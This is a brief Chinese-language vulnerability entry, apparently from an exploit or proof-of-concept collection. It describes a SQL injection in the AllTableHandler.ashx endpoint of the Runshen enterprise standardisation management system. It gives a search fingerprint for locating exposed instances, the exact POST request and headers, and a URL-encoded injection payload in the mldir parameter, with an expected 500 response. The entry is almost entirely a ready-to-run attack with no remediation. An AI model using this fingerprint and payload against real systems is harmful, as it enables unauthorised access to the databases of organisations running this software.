# 润申信息企业标准化管理系统AllTableHandler.ashx存在SQL注入漏洞

- **系统**：润申信息企业标准化管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="PDCA/js/_publicCom.js"`
- **请求**：`POST /PDCA/ashx/AllTableHandler.ashx?action=GetAll HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
IsOrder=4&mldir=%28SELECT+CONCAT%28CONCAT%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2C%28CASE+WHEN+%287759%3D7759%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29&zydir=&code=&status=1%2C2%2C3%2C4&page=1&rows=30
```
- **预期**：500　|　—